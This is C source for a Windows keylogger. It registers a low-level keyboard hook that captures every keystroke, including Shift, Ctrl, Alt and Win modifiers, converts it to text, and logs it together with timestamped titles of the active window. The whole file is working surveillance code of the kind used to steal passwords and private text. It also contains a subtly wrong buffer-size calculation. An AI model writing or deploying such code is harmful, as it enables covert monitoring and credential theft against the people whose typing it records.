#include "winkey.h"

LRESULT __stdcall	hook_callback(int n_code, WPARAM w_param, LPARAM l_param)
{
	if (n_code >= 0)
	{
		if (w_param == WM_KEYDOWN)
		{
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l_param;
			HKL hkl = GetKeyboardLayout(0);
			BYTE keyboardState[256];
			wchar_t keyBuf[8];
			char buffer[256];
			char *ptr = buffer;

			memset(buffer, 0, sizeof(buffer));
			memset(keyboardState, 0, sizeof(keyboardState));
			memset(keyBuf, 0, sizeof(keyBuf));
			GetKeyState(0);
			GetKeyboardState(keyboardState);
			if (((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000)) &&
				(kb->vkCode >= 'A'  && kb->vkCode <= 'Z'))
			{
				memcpy(ptr, "Shift", 5);
				ptr += 5;
			}
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000))
			{
				memcpy(ptr, "Ctrl", 4);
				ptr += 4;
				keyboardState[VK_CONTROL] = 0;
				if (kb->vkCode >= 'A'  && kb->vkCode <= 'Z')
					keyboardState[VK_SHIFT] = 128;
			}
			if ((GetAsyncKeyState(VK_LMENU) & 0x8000) || (GetAsyncKeyState(VK_RMENU) & 0x8000))
			{
				memcpy(ptr, "Alt", 3);
				ptr += 3;
				keyboardState[VK_MENU] = 0;
				if (kb->vkCode >= 'A'  && kb->vkCode <= 'Z')
					keyboardState[VK_SHIFT] = 128;
			}
			if ((GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000))
			{
				memcpy(ptr, "Win", 3);
				ptr += 3;
				if (kb->vkCode >= 'A'  && kb->vkCode <= 'Z')
					keyboardState[VK_SHIFT] = 128;
			}
			if (ToUnicodeEx(kb->vkCode, kb->scanCode, keyboardState, keyBuf, 8, 0, hkl) > 0)
			{
				if (strcmp(g_winkey.window_prev, g_winkey.window_title))
				{
					SYSTEMTIME st;

					GetSystemTime(&st);
					log_window(st, g_winkey.window_title);
					memcpy(g_winkey.window_prev, g_winkey.window_title, strlen(g_winkey.window_title) + 1);
				}
				size_t n = 0;
				wcstombs_s(&n, ptr, (buffer - ptr) + 256, keyBuf, 8);
				log_key(buffer, ptr);
			}
		}
	}
	return CallNextHookEx(g_winkey.hook_keyboard, n_code, w_param, l_param);
}

LRESULT __stdcall	win_event_proc_callback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	(void)hWinEventHook, dwEvent, idObject, idChild, dwEventThread, dwmsEventTime;
	GetWindowText(hwnd, g_winkey.window_title, sizeof(g_winkey.window_title));
	return (0);
}
